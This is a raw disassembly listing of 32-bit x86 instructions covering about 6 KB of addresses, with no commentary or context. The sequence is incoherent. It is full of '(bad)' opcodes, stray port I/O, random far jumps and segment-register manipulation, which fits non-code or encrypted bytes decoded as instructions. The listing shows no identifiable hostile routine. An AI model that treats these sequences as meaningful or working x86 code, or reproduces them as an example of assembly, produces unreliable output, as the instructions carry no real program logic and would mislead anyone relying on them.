  4158a2:	inc    esi
  4158a3:	nop
  4158a4:	add    ecx,DWORD PTR [eax-0x1cc6365]
  4158aa:	fbstp  TBYTE PTR [ebx]
  4158ac:	repz mov ?,WORD PTR [edi+0x5]
  4158b0:	popf   
  4158b1:	aam    0x68
  4158b3:	cld    
  4158b4:	test   DWORD PTR [esi-0x19],eax
  4158b7:	out    0x93,eax
  4158b9:	xor    DWORD PTR [esp+eax*8-0x24cf1d25],0x4b
  4158c1:	fidiv  WORD PTR [edx+esi*4-0x7a0ef377]
  4158c8:	sub    eax,0x383bda73
  4158cd:	adc    ah,ch
  4158cf:	xor    edi,esi
  4158d1:	dec    ebp
  4158d2:	lock xchg ecx,eax
  4158d4:	sbb    al,BYTE PTR [edi-0x18e06c49]
  4158da:	aaa    
  4158db:	inc    eax
  4158dc:	inc    ebp
  4158dd:	ins    DWORD PTR es:[edi],dx
  4158de:	jno    0x41595e
  4158e0:	cmp    eax,0x4d907ab7
  4158e5:	leave  
  4158e6:	mov    esi,DWORD PTR [esi-0xa]
  4158e9:	mov    WORD PTR [edx-0x3b8ce13f],gs
  4158ef:	outs   dx,DWORD PTR gs:[esi]
  4158f1:	xor    al,0x50
  4158f3:	inc    ecx
  4158f4:	sub    BYTE PTR [edx+0xe],0xda
  4158f8:	add    edi,edx
  4158fa:	popf   
  4158fb:	adc    eax,0xdf80bfc8
  415900:	lods   al,BYTE PTR ds:[esi]
  415901:	cdq    
  415902:	inc    esp
  415903:	scas   eax,DWORD PTR es:[edi]
  415904:	xor    esp,edx
  415906:	scas   al,BYTE PTR es:[edi]
  415907:	mov    ebp,0xdcf1f7b5
  41590c:	pop    ebx
  41590d:	xor    al,bl
  41590f:	xchg   esi,eax
  415910:	dec    esp
  415911:	call   0xc27b:0x3b1a63a0
  415918:	lods   al,BYTE PTR ds:[esi]
  415919:	sub    eax,0x5b104cd1
  41591e:	loope  0x41594c
  415920:	div    DWORD PTR [ecx]
  415922:	or     esp,DWORD PTR [edi]
  415924:	add    al,0x7a
  415926:	popa   
  415927:	pop    ebp
  415928:	or     BYTE PTR [edx+0x18],0xc2
  41592c:	pop    eax
  41592d:	push   cs
  41592e:	stos   DWORD PTR es:[edi],eax
  41592f:	sub    ebp,edi
  415931:	aas    
  415932:	loope  0x415958
  415934:	dec    edx
  415935:	loope  0x4159b2
  415937:	popa   
  415938:	cmp    DWORD PTR [ebx-0x3b25014b],eax
  41593e:	ror    edx,1
  415940:	mov    ebp,0xc70017d0
  415945:	adc    eax,0xdd1a8df9
  41594a:	aad    0xde
  41594c:	xor    al,0xb4
  41594e:	pop    es
  41594f:	pop    ss
  415950:	inc    esp
  415951:	and    dh,al
  415953:	pusha  
  415954:	jmp    0x2f5ad071
  415959:	leave  
  41595a:	in     al,0x91
  41595c:	neg    DWORD PTR [esi+edi*1-0x46]
  415960:	aam    0x28
  415962:	mov    ds:0x337a89da,al
  415967:	sub    dl,ch
  415969:	add    al,0x64
  41596b:	pop    ss
  41596c:	retf   
  41596d:	xchg   edx,eax
  41596e:	push   esi
  41596f:	(bad)  
  415970:	pop    ebp
  415971:	lods   al,BYTE PTR ds:[esi]
  415972:	addr16 mov eax,ds:0x36ea
  415976:	xor    eax,DWORD PTR [ebx+0x47]
  415979:	imul   edx,DWORD PTR [edx+0x34],0x9d7aed53
  415980:	inc    ebx
  415981:	sbb    al,0xd6
  415983:	inc    edx
  415984:	xchg   edi,eax
  415985:	fs enter 0x6795,0x18
  41598a:	packuswb mm2,QWORD PTR [edx-0x40]
  41598e:	(bad)
  415992:	pushf  
  415993:	add    ebp,edi
  415995:	jne    0x415996
  415997:	mov    esp,0x16b46df4
  41599c:	xchg   edi,eax
  41599d:	and    dl,BYTE PTR [edx]
  41599f:	add    esp,DWORD PTR [ecx]
  4159a1:	mov    ebp,0xe3db2b77
  4159a6:	cli    
  4159a7:	mov    ebx,0xf4a00fdf
  4159ac:	(bad)  
  4159ad:	fiadd  WORD PTR ds:0xb0b1affb
  4159b3:	stos   BYTE PTR es:[edi],al
  4159b4:	xchg   edx,eax
  4159b5:	sub    DWORD PTR [eax-0x7e5dfdb5],edx
  4159bb:	fidiv  DWORD PTR [eax-0x35]
  4159be:	cmp    al,0x1a
  4159c0:	adc    ecx,0x446d4c91
  4159c6:	pop    eax
  4159c7:	mov    edx,0xd3ae71b9
  4159cc:	dec    edx
  4159cd:	retf   
  4159ce:	imul   ecx,DWORD PTR [ebx+0x1f],0xffffffca
  4159d2:	(bad)  
  4159d4:	xor    eax,0x3f394220
  4159d9:	jmp    0x4467:0x93451d64
  4159e0:	push   edi
  4159e1:	mov    dh,0xa3
  4159e3:	data16 cmc 
  4159e5:	push   ds
  4159e6:	les    eax,FWORD PTR [esi-0x1e]
  4159e9:	jb     0x4159fd
  4159eb:	mov    bl,0x79
  4159ed:	loopne 0x415986
  4159ef:	mov    edi,0x5c8e17d2
  4159f4:	inc    ebx
  4159f5:	fisttp DWORD PTR [esi+eax*1]
  4159f8:	out    dx,al
  4159f9:	call   0xe444:0x604b98bf
  415a00:	inc    esp
  415a01:	out    dx,eax
  415a02:	dec    esi
  415a03:	ret    
  415a04:	push   ebp
  415a05:	add    bl,al
  415a07:	lods   al,BYTE PTR ds:[esi]
  415a08:	xchg   ebx,eax
  415a09:	out    dx,eax
  415a0a:	sbb    DWORD PTR [edx-0x78],ebp
  415a0d:	sbb    al,0x58
  415a0f:	pop    ebp
  415a10:	inc    edi
  415a11:	xor    ah,BYTE PTR [edi]
  415a13:	mov    ds:0x4992a437,eax
  415a18:	dec    ebx
  415a19:	(bad)  
  415a1a:	pushf  
  415a1b:	scas   al,BYTE PTR es:[edi]
  415a1c:	xchg   esp,eax
  415a1d:	pop    ss
  415a1e:	add    al,0x2c
  415a20:	add    DWORD PTR [esi-0x3c],ebp
  415a23:	mov    esi,0xa7f6d239
  415a28:	das    
  415a29:	push   ecx
  415a2a:	fist   WORD PTR [ecx]
  415a2c:	cmp    DWORD PTR [edi],edx
  415a2e:	xchg   ebp,eax
  415a2f:	jl     0x415a65
  415a31:	add    eax,0x507acbde
  415a36:	sub    BYTE PTR [esi+eax*4-0x39],0x2b
  415a3b:	out    dx,al
  415a3c:	sti    
  415a3d:	mov    ch,0x17
  415a3f:	or     al,0x5a
  415a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a42:	mov    al,0xee
  415a44:	inc    ebp
  415a45:	sub    al,0x9a
  415a47:	mov    ebx,0xb54e02ff
  415a4c:	in     eax,dx
  415a4d:	push   cs
  415a4e:	es cmp eax,0x6d53371a
  415a54:	popa   
  415a55:	mov    al,0x3a
  415a57:	pop    ebx
  415a58:	(bad)  
  415a59:	and    al,0x56
  415a5b:	mov    ecx,0x92b144c8
  415a60:	add    bl,BYTE PTR [esi-0x6b629c82]
  415a66:	mov    eax,ds:0x20e3f05c
  415a6b:	mov    dl,cl
  415a6d:	ret    0xb846
  415a70:	xchg   bh,al
  415a72:	fstp   QWORD PTR [eax+edx*8-0x3b58dec3]
  415a79:	ins    DWORD PTR es:[edi],dx
  415a7a:	and    BYTE PTR [eax+0x18],bh
  415a7d:	jle    0x415ae9
  415a7f:	xchg   esp,eax
  415a80:	cmp    esi,DWORD PTR [ecx-0x561fc229]
  415a86:	mov    al,0x0
  415a88:	inc    edi
  415a89:	popf   
  415a8a:	scas   eax,DWORD PTR es:[edi]
  415a8b:	jge    0x415ab0
  415a8d:	xlat   BYTE PTR ds:[ebx]
  415a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a8f:	call   0xd3d9:0x141d34a
  415a96:	inc    esi
  415a97:	cld    
  415a98:	aad    0xfa
  415a9a:	adc    dl,BYTE PTR [eax-0x36]
  415a9d:	cmp    DWORD PTR [edx],0xcde8a3e0
  415aa3:	and    ah,BYTE PTR [edx-0xe14e407]
  415aa9:	push   0x55
  415aab:	leave  
  415aac:	ins    BYTE PTR es:[edi],dx
  415aad:	xchg   ecx,eax
  415aae:	pop    ss
  415aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ab0:	dec    ecx
  415ab1:	fwait
  415ab2:	add    dh,BYTE PTR [edi-0x23d85998]
  415ab8:	int    0xa
  415aba:	or     eax,DWORD PTR [ebp+0x7]
  415abd:	xor    eax,0x78b11bbb
  415ac2:	loope  0x415add
  415ac4:	sahf   
  415ac5:	in     eax,dx
  415ac6:	mov    bh,BYTE PTR [esi+0x5d]
  415ac9:	cmp    BYTE PTR [esi+0x10],ah
  415acc:	cmp    DWORD PTR [esi-0x791365c3],0x76dafbf6
  415ad6:	mov    ds:0xb30c652d,al
  415adb:	jmp    0xec64a071
  415ae0:	jo     0x415a7c
  415ae2:	ret    0x3a41
  415ae5:	pop    esi
  415ae6:	retf   0xe1ce
  415ae9:	scas   eax,DWORD PTR es:[edi]
  415aea:	sub    ebp,ebp
  415aec:	mov    al,ds:0x4f411c97
  415af1:	mov    es,WORD PTR [ecx-0x1a]
  415af4:	and    DWORD PTR [eax+0x16],edi
  415af7:	sub    eax,eax
  415af9:	add    eax,0x4b619531
  415afe:	and    cl,BYTE PTR [ebp-0x2c]
  415b01:	ret    0xbd89
  415b04:	jmp    0x415b16
  415b06:	scas   al,BYTE PTR es:[edi]
  415b07:	mov    eax,0xa9937305
  415b0c:	add    al,0x5
  415b0e:	push   ecx
  415b0f:	jl     0x415acb
  415b11:	or     DWORD PTR [edi+0xd12659d],ecx
  415b17:	sti    
  415b18:	test   BYTE PTR [esp+ecx*4],0xa5
  415b1c:	ins    DWORD PTR es:[edi],dx
  415b1d:	addr16 inc ebp
  415b1f:	call   0x8210:0xed3bc51a
  415b26:	mov    al,0x92
  415b28:	leave  
  415b29:	xchg   DWORD PTR [eax+esi*4],edi
  415b2c:	jns    0x415b97
  415b2e:	imul   ebx,DWORD PTR [edx+0x71],0x83675f19
  415b35:	sbb    DWORD PTR [ebx+eiz*1+0x2c],edi
  415b39:	sub    DWORD PTR [ecx+0x5e43ed04],edi
  415b3f:	dec    esi
  415b40:	aaa    
  415b41:	xor    dh,dh
  415b43:	popa   
  415b44:	jmp    0x166eff66
  415b49:	cmp    BYTE PTR [edx+0x13],0xb4
  415b4d:	fisttp DWORD PTR [eax]
  415b4f:	fimul  DWORD PTR [ebx+0x29]
  415b52:	shl    DWORD PTR [edi],0x7
  415b55:	push   cs
  415b56:	ja     0x415b04
  415b58:	lock daa 
  415b5a:	sbb    ebp,edi
  415b5c:	sti    
  415b5d:	in     al,dx
  415b5e:	adc    BYTE PTR [edi-0x7f3fcdef],ch
  415b64:	sti    
  415b65:	cwde   
  415b66:	into   
  415b67:	shl    ah,0x4f
  415b6a:	jmp    0xa190:0x7adacd64
  415b71:	dec    eax
  415b72:	sub    BYTE PTR [ebp+0x63fd3822],0xcf
  415b79:	mov    ecx,0x917133bd
  415b7e:	shl    ebp,0x87
  415b81:	jl     0x415b71
  415b83:	mov    ah,0xe1
  415b85:	adc    dl,BYTE PTR [edx+0x4239d16f]
  415b8b:	pop    edi
  415b8c:	add    DWORD PTR [ebx+0x6b02d3b9],ecx
  415b92:	div    BYTE PTR ds:[esi]
  415b95:	jle    0x415b34
  415b97:	leave  
  415b98:	mov    edx,0x7c39d20f
  415b9d:	mov    ah,0xe9
  415b9f:	push   edi
  415ba0:	and    al,0xd4
  415ba2:	pop    ebx
  415ba3:	jno    0x415b3b
  415ba5:	dec    edi
  415ba6:	sbb    BYTE PTR [eax],ch
  415ba8:	into   
  415ba9:	add    al,0xd7
  415bab:	loope  0x415bba
  415bad:	push   ebp
  415bae:	jb     0x415bd0
  415bb0:	sub    eax,0xf18f73cd
  415bb5:	xchg   ecx,eax
  415bb6:	xchg   ebx,eax
  415bb7:	mov    ds:0x899a2fdb,al
  415bbc:	push   esi
  415bbd:	test   eax,0xf0bc3260
  415bc2:	les    eax,FWORD PTR [ebx+0x6fd15ccb]
  415bc8:	repnz int3 
  415bca:	in     al,dx
  415bcb:	jmp    0x28f5:0xb43f41f1
  415bd2:	push   edi
  415bd3:	ds call 0x1d99c61
  415bd9:	xchg   esp,eax
  415bda:	rol    BYTE PTR [edx+edx*4-0x13],0xc7
  415bdf:	pop    edi
  415be0:	jle    0x415c51
  415be2:	jbe    0x415be0
  415be4:	cmp    al,0x7d
  415be6:	stc    
  415be7:	mov    ds:0xcc86ca6c,eax
  415bec:	lods   al,BYTE PTR ds:[esi]
  415bed:	dec    edx
  415bee:	sbb    BYTE PTR [edx],bl
  415bf0:	jns    0x415b97
  415bf2:	stos   BYTE PTR es:[edi],al
  415bf3:	dec    ecx
  415bf4:	dec    edx
  415bf5:	jnp    0x415b7e
  415bf7:	inc    esi
  415bf8:	mov    dh,0x2d
  415bfa:	adc    esi,DWORD PTR [eax+0xae4c30]
  415c00:	inc    edi
  415c01:	sbb    esp,DWORD PTR [ecx+0xb]
  415c04:	enter  0x210f,0xf6
  415c08:	arpl   WORD PTR [edi-0x13715e3e],bp
  415c0e:	or     ecx,DWORD PTR [edx]
  415c10:	sbb    al,0xe9
  415c12:	push   ss
  415c13:	and    ah,BYTE PTR [edi]
  415c15:	inc    ebp
  415c16:	cmp    al,0x1e
  415c18:	outs   dx,BYTE PTR ds:[esi]
  415c19:	shr    BYTE PTR [ecx-0x28c5b3ee],cl
  415c1f:	pop    edi
  415c20:	adc    DWORD PTR [eax+0x2b],edx
  415c23:	sub    al,0x60
  415c25:	push   ss
  415c26:	sub    al,0x46
  415c28:	and    ch,BYTE PTR [edi]
  415c2a:	or     al,0xe0
  415c2c:	sbb    eax,0x9ebc8aac
  415c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c32:	xchg   edx,eax
  415c33:	cdq    
  415c34:	cdq    
  415c35:	shr    esp,0xed
  415c38:	je     0x415c43
  415c3a:	jmp    0x3ba2d24a
  415c3f:	out    dx,al
  415c40:	not    DWORD PTR [esi-0xb]
  415c43:	or     al,0x54
  415c45:	jecxz  0x415c45
  415c47:	fistp  QWORD PTR [edi-0x40]
  415c4a:	push   esp
  415c4b:	sbb    ch,BYTE PTR [edx+eiz*2-0x2a7adb5a]
  415c52:	or     ch,bh
  415c54:	popa   
  415c55:	sbb    bl,cl
  415c57:	push   0x57
  415c59:	jecxz  0x415be7
  415c5b:	xchg   edx,eax
  415c5c:	fld    TBYTE PTR [eax]
  415c5e:	mov    ds:0xdf58d63c,al
  415c63:	mov    esp,0xdb56007a
  415c68:	jae    0x415caa
  415c6a:	dec    ebx
  415c6b:	scas   al,BYTE PTR es:[edi]
  415c6c:	lds    eax,FWORD PTR [ecx]
  415c6e:	retf   
  415c6f:	push   cs
  415c70:	adc    eax,0x37261458
  415c75:	and    BYTE PTR [eax-0x80],0x7c
  415c79:	jmp    0x415c12
  415c7b:	mov    edi,0x259312b2
  415c80:	into   
  415c81:	cli    
  415c82:	inc    ecx
  415c83:	test   BYTE PTR ds:[ecx],ah
  415c86:	addr16 jbe 0x415c45
  415c89:	out    0x9b,eax
  415c8b:	call   0x61f1905e
  415c90:	pop    ss
  415c91:	shr    BYTE PTR [eax-0x5f],1
  415c94:	shl    DWORD PTR [ebp-0x519385ef],1
  415c9a:	icebp  
  415c9b:	test   al,0x5a
  415c9d:	(bad)  
  415c9e:	xor    ebp,esp
  415ca0:	pop    esp
  415ca1:	fdiv   DWORD PTR [edx+0x231391e4]
  415ca7:	push   es
  415ca8:	clc    
  415ca9:	sbb    esp,ebx
  415cab:	fdiv   QWORD PTR [edx-0xf8d54e7]
  415cb1:	dec    ebp
  415cb2:	and    DWORD PTR [ebx],eax
  415cb4:	mov    ebp,0xccc5e0eb
  415cb9:	dec    ebp
  415cba:	jmp    0x2d58:0x6689a6b8
  415cc1:	aaa    
  415cc2:	sub    edx,DWORD PTR [esi]
  415cc4:	dec    ebx
  415cc5:	aam    0xf8
  415cc7:	jmp    0x415d30
  415cc9:	test   al,0x21
  415ccb:	dec    esi
  415ccc:	mov    edx,0x4340cefd
  415cd1:	mov    DWORD PTR [esi],ebp
  415cd3:	or     edi,DWORD PTR [eax+0x100f01c2]
  415cd9:	scas   eax,DWORD PTR es:[edi]
  415cda:	push   ds
  415cdb:	neg    eax
  415cdd:	aas    
  415cde:	int    0x78
  415ce0:	das    
  415ce1:	sbb    BYTE PTR [ebx+0xd],0xd8
  415ce5:	jne    0x415cec
  415ce7:	fdivr  QWORD PTR [ecx]
  415ce9:	mov    ss,WORD PTR [edi]
  415ceb:	lds    ebx,FWORD PTR [eax]
  415ced:	(bad)  
  415cee:	repnz (bad) 
  415cf0:	int3   
  415cf1:	and    esp,DWORD PTR [esi-0x31]
  415cf4:	imul   ebp,DWORD PTR [ebp-0x1e64f7c8],0x7c419f70
  415cfe:	xchg   ecx,eax
  415cff:	dec    esp
  415d00:	or     bl,BYTE PTR [eax]
  415d02:	jns    0x415c8a
  415d04:	cmp    al,0x73
  415d06:	mov    al,0x35
  415d08:	outs   dx,DWORD PTR ds:[esi]
  415d09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d0a:	aaa    
  415d0b:	mov    ch,0x21
  415d0d:	mov    es,WORD PTR [edi+0x4b5a9bd6]
  415d13:	mov    ebp,0xde4d36
  415d18:	shl    esi,cl
  415d1a:	ret    
  415d1b:	mov    esp,0xb3896242
  415d20:	sub    eax,0x985f4d33
  415d25:	mov    edx,0x98795006
  415d2a:	jp     0x415d68
  415d2c:	adc    ebx,edx
  415d2e:	jno    0x415cb5
  415d30:	imul   esp,DWORD PTR [esi-0xd9bffe2],0x5
  415d37:	icebp  
  415d38:	xor    BYTE PTR [edx-0x38e19ffe],dl
  415d3e:	fwait
  415d3f:	loop   0x415d95
  415d41:	mov    bl,0xeb
  415d43:	aaa    
  415d44:	dec    ecx
  415d45:	fnstcw WORD PTR [edx-0x3e]
  415d48:	jmp    0x9b04:0x872066b4
  415d4f:	cmp    BYTE PTR [edx+0x68],bh
  415d52:	pop    ebx
  415d53:	lahf   
  415d54:	fsubr  DWORD PTR [edi-0x7f]
  415d57:	into   
  415d58:	sbb    ebp,DWORD PTR [ebx]
  415d5a:	inc    esp
  415d5b:	pop    eax
  415d5c:	xchg   esi,eax
  415d5d:	pusha  
  415d5e:	out    dx,eax
  415d5f:	call   0xca6c4a83
  415d64:	jns    0x415d7f
  415d66:	sbb    eax,0x6ed6bba0
  415d6b:	repz aaa 
  415d6d:	mov    ebx,0x26636332
  415d72:	push   edi
  415d73:	and    edx,0xffffffac
  415d76:	into   
  415d77:	inc    ecx
  415d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d7a:	fwait
  415d7b:	jb     0x415d0b
  415d7d:	mov    bh,0x96
  415d7f:	ins    BYTE PTR es:[edi],dx
  415d80:	retf   0x36bd
  415d83:	mov    ds:0x34ccd157,al
  415d88:	inc    ebp
  415d89:	loope  0x415d5d
  415d8b:	mov    edx,DWORD PTR [ecx+0x79]
  415d8e:	xchg   BYTE PTR [ecx],dl
  415d90:	dec    eax
  415d91:	mov    edi,DWORD PTR [edi]
  415d93:	mov    bh,0xf3
  415d95:	dec    eax
  415d96:	sbb    esp,DWORD PTR [ecx-0x3725642f]
  415d9c:	jg     0x415e01
  415d9e:	and    eax,0x105374c1
  415da3:	pop    edx
  415da4:	out    0x6b,al
  415da6:	in     eax,dx
  415da7:	sbb    eax,DWORD PTR [edx-0xd]
  415daa:	je     0x415d2f
  415dac:	mov    gs,WORD PTR [eax]
  415dae:	test   eax,0xe8eb611f
  415db3:	repnz out dx,eax
  415db5:	xor    eax,ecx
  415db7:	xor    eax,0xdd75eaf6
  415dbc:	sbb    DWORD PTR [ecx+0x4cd5cea2],eax
  415dc2:	push   ecx
  415dc3:	cmp    BYTE PTR [ebx-0x62f27e90],ah
  415dc9:	xchg   edx,eax
  415dca:	adc    eax,0xc5d7e386
  415dcf:	pop    eax
  415dd0:	ds xchg dx,ax
  415dd3:	out    0xf2,al
  415dd5:	push   ebx
  415dd6:	or     BYTE PTR [ecx],ch
  415dd8:	sbb    DWORD PTR [ebx+0x6d],eax
  415ddb:	outs   dx,BYTE PTR ds:[esi]
  415ddc:	push   edx
  415ddd:	je     0x415e46
  415ddf:	cmp    eax,0x1d31f19f
  415de4:	mov    ds:0xfb0fa419,al
  415de9:	inc    eax
  415dea:	ret    
  415deb:	js     0x415de8
  415ded:	out    dx,eax
  415dee:	xchg   ebx,eax
  415def:	adc    BYTE PTR [ebp+0x68],bh
  415df2:	(bad)  
  415df3:	pop    esi
  415df4:	out    dx,eax
  415df5:	dec    edi
  415df6:	inc    eax
  415df7:	(bad)
  415dfc:	out    dx,eax
  415dfd:	aas    
  415dfe:	paddsw mm2,QWORD PTR [eax+0x33e0627]
  415e05:	pop    eax
  415e06:	lods   eax,DWORD PTR ds:[esi]
  415e07:	sub    ch,BYTE PTR [ebx+0x62958e2f]
  415e0d:	push   0xbd7f32fc
  415e12:	mov    al,0x14
  415e14:	outs   dx,BYTE PTR ds:[esi]
  415e15:	gs ja  0x415e15
  415e18:	pop    ss
  415e19:	lds    eax,FWORD PTR [eax+0xb]
  415e1c:	std    
  415e1d:	adc    DWORD PTR [edi+eiz*8],esp
  415e20:	lea    edi,[eax-0xc5d6c05]
  415e26:	xor    al,0x61
  415e28:	mov    al,ds:0x24ebe07c
  415e2d:	xchg   DWORD PTR [ecx-0x9],ebx
  415e30:	mov    ebp,0x86a11b11
  415e35:	add    BYTE PTR [ecx-0x11],al
  415e38:	fld    TBYTE PTR [edx+edi*4]
  415e3b:	mov    bh,0x16
  415e3d:	add    BYTE PTR [edi-0x20],dl
  415e40:	adc    BYTE PTR [edi-0x6d4a2db0],ah
  415e46:	push   esi
  415e47:	mov    dh,0x4
  415e49:	sub    DWORD PTR [esi+0x3731b1a1],esp
  415e4f:	aaa    
  415e50:	mov    eax,ds:0x72821ff7
  415e55:	cmp    BYTE PTR [ebx],ch
  415e57:	loop   0x415e8d
  415e59:	push   ebp
  415e5a:	fdivrp st(3),st
  415e5c:	rol    BYTE PTR [ebp+0x4c487082],1
  415e62:	mov    edx,0x9c984e80
  415e67:	dec    esp
  415e68:	sti    
  415e69:	jbe    0x415ebe
  415e6b:	or     eax,0xaa33f42a
  415e70:	pop    ss
  415e71:	inc    eax
  415e72:	das    
  415e73:	jo     0x415ed3
  415e75:	inc    ebx
  415e76:	jns    0x415e27
  415e78:	or     bl,al
  415e7a:	sbb    cl,BYTE PTR [edi]
  415e7c:	sbb    DWORD PTR [edi-0x7bab001c],eax
  415e82:	pop    ds
  415e83:	jg     0x415e3c
  415e85:	sbb    al,0xde
  415e87:	mov    bl,0x19
  415e89:	mov    esp,0xf939ac0e
  415e8e:	popf   
  415e8f:	leave  
  415e90:	mov    dh,0x83
  415e92:	inc    edi
  415e93:	mov    edx,0x37769d24
  415e98:	test   BYTE PTR [eax+edi*2+0x6e44fafd],al
  415e9f:	leave  
  415ea0:	xchg   esi,eax
  415ea1:	stos   BYTE PTR es:[edi],al
  415ea2:	fdivr  DWORD PTR [esi-0x1f809b32]
  415ea8:	jno    0x415e6c
  415eaa:	mov    dh,bl
  415eac:	and    eax,0xda89d11d
  415eb1:	aas    
  415eb2:	add    eax,0xaa1e8f29
  415eb7:	dec    edx
  415eb8:	mov    esp,0xbd14f6f3
  415ebd:	hlt    
  415ebe:	xchg   edi,eax
  415ebf:	data16 js 0x415ee4
  415ec2:	xor    BYTE PTR [ebx],al
  415ec4:	ss jecxz 0x415e7d
  415ec7:	pushf  
  415ec8:	mov    edi,0x3e8ce2f9
  415ecd:	stc    
  415ece:	mov    al,BYTE PTR [ecx]
  415ed0:	add    al,0xd5
  415ed2:	dec    edx
  415ed3:	adc    DWORD PTR [edi],edx
  415ed5:	xchg   edi,eax
  415ed6:	or     BYTE PTR [edi-0x40],cl
  415ed9:	adc    eax,0x1cded91d
  415ede:	lock div DWORD PTR [eax+0x47]
  415ee2:	xchg   esi,eax
  415ee3:	jae    0x415f5c
  415ee5:	sbb    DWORD PTR [edx-0x3c124286],ebx
  415eeb:	sti    
  415eec:	mov    ds:0x8e89dd34,al
  415ef1:	jae    0x415eb0
  415ef3:	out    dx,eax
  415ef4:	mov    ebx,fs
  415ef6:	aad    0x53
  415ef8:	mov    WORD PTR [ebx+0x12],fs
  415efb:	and    al,0xb3
  415efd:	shl    BYTE PTR [ebp-0x2],cl
  415f00:	jge    0x415f07
  415f02:	sar    eax,1
  415f04:	ret    
  415f05:	xchg   BYTE PTR [edi+0x31ecb0f9],ch
  415f0b:	das    
  415f0c:	dec    ebp
  415f0d:	pause  
  415f0f:	sub    al,0xd7
  415f11:	jbe    0x415ea1
  415f13:	mov    dh,0x3b
  415f15:	je     0x415ea3
  415f17:	xchg   ebx,eax
  415f18:	sub    eax,0xd3c44fb1
  415f1d:	mov    eax,DWORD PTR [ebp+ecx*1+0x27]
  415f21:	addr16 xor dh,dl
  415f24:	ror    DWORD PTR [esp+eax*2-0x4a],1
  415f28:	cs jge 0x415eba
  415f2b:	push   ebp
  415f2c:	xor    eax,0x905fc741
  415f31:	retf   0xd797
  415f34:	dec    ebp
  415f35:	xchg   ebx,eax
  415f36:	mov    ah,0x41
  415f38:	pusha  
  415f39:	call   0xf449:0x63542fe3
  415f40:	mov    edx,ebx
  415f42:	enter  0xf232,0xde
  415f46:	mov    ecx,0x9afbdf45
  415f4b:	aaa    
  415f4c:	push   edx
  415f4d:	mov    al,ds:0xbf63cdbc
  415f52:	jo     0x415f8c
  415f54:	fnclex 
  415f56:	add    esp,DWORD PTR [ebx]
  415f58:	imul   eax,eax,0x50
  415f5b:	jnp    0x415fab
  415f5d:	hlt    
  415f5e:	push   ebp
  415f5f:	xchg   ebx,eax
  415f60:	sbb    eax,0x75f14409
  415f65:	push   es
  415f66:	cmp    al,0x86
  415f68:	aad    0xdb
  415f6a:	js     0x415fac
  415f6c:	mov    ecx,0xaead2d5d
  415f71:	(bad)  
  415f73:	loop   0x415f48
  415f75:	cld    
  415f76:	mov    dh,0x6e
  415f78:	and    BYTE PTR [ecx+0x72389dd6],ch
  415f7e:	inc    esi
  415f7f:	add    DWORD PTR [ebp+0x54],eax
  415f82:	fsub   DWORD PTR [ebx+0x18572dd8]
  415f88:	fimul  WORD PTR [edi+0x7c]
  415f8b:	ins    BYTE PTR es:[edi],dx
  415f8c:	and    bl,BYTE PTR [eax+0x79]
  415f8f:	ins    DWORD PTR es:[edi],dx
  415f90:	and    al,0x1e
  415f92:	sub    al,BYTE PTR [edi+edi*1-0xd]
  415f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f97:	mov    edi,0xaf46b518
  415f9c:	xor    eax,0x733b8256
  415fa1:	arpl   WORD PTR ds:0x773ed93c,dx
  415fa7:	pop    edx
  415fa8:	repz aad 0x3a
  415fab:	xchg   ah,al
  415fad:	rol    BYTE PTR [edi-0x1e30770d],0x15
  415fb4:	cmp    dh,dh
  415fb6:	add    bl,BYTE PTR [eax-0x11ce0c01]
  415fbc:	call   0xc5ab:0x2adecd68
  415fc3:	jg     0x416033
  415fc5:	ja     0x415f71
  415fc7:	leave  
  415fc8:	aad    0xb
  415fca:	dec    ecx
  415fcb:	pop    ecx
  415fcc:	ins    BYTE PTR es:[edi],dx
  415fcd:	test   esp,ebp
  415fcf:	pop    ecx
  415fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fd1:	jns    0x415fae
  415fd3:	scas   eax,DWORD PTR es:[edi]
  415fd4:	mov    esi,0xd67801fe
  415fd9:	cmp    eax,0x18df3a6a
  415fde:	dec    esi
  415fdf:	(bad)  
  415fe0:	retf   0x34bd
  415fe3:	pop    ds
  415fe4:	mov    ch,0x74
  415fe7:	aas    
  415fe8:	or     bh,BYTE PTR [esp+esi*8]
  415feb:	mov    ecx,0xef7a5453
  415ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ff1:	mov    BYTE PTR [esi-0x2e],bh
  415ff4:	xor    DWORD PTR [ebx],0xcdd7646d
  415ffa:	or     BYTE PTR [esi-0x5187710e],0x76
  416001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416002:	and    cl,BYTE PTR [eax+esi*2+0x147512da]
  416009:	in     al,0xb
  41600b:	and    eax,0x4b684ff1
  416010:	ja     0x415fc5
  416012:	clc    
  416013:	ja     0x415fb7
  416015:	sti    
  416016:	stos   BYTE PTR es:[edi],al
  416017:	mov    al,ds:0x4bc5dd06
  41601c:	fidiv  WORD PTR [esi]
  41601e:	ror    DWORD PTR [ecx+0x41],cl
  416021:	dec    esp
  416023:	pop    ebx
  416024:	cdq    
  416025:	xchg   DWORD PTR [edi+0x47],ebp
  416028:	xor    DWORD PTR [edx+eiz*2+0x4d],edi
  41602c:	add    DWORD PTR [edi-0x1dd89620],ebp
  416032:	push   es
  416033:	test   al,0xd4
  416035:	std    
  416036:	pop    esp
  416037:	sbb    ecx,DWORD PTR [edx]
  416039:	xchg   edx,eax
  41603a:	fld    QWORD PTR ds:0xf1f66fc3
  416040:	rol    DWORD PTR [eax+0x712b8577],1
  416046:	(bad)  
  416047:	xchg   esp,eax
  416048:	xchg   esp,eax
  416049:	xor    bl,BYTE PTR [ecx]
  41604b:	xchg   ebp,eax
  41604c:	and    al,ch
  41604e:	dec    edi
  41604f:	or     DWORD PTR [eax-0x3c],0x423aed75
  416056:	dec    edi
  416057:	xchg   edx,eax
  416058:	xor    ebx,DWORD PTR [edx+edi*8-0x3]
  41605c:	jo     0x4160d7
  41605e:	push   ebp
  41605f:	inc    esp
  416060:	push   0xffffffb1
  416062:	dec    esp
  416063:	(bad)  
  416064:	mov    bh,dh
  416066:	adc    BYTE PTR [esp+eax*8-0x3aab1459],bh
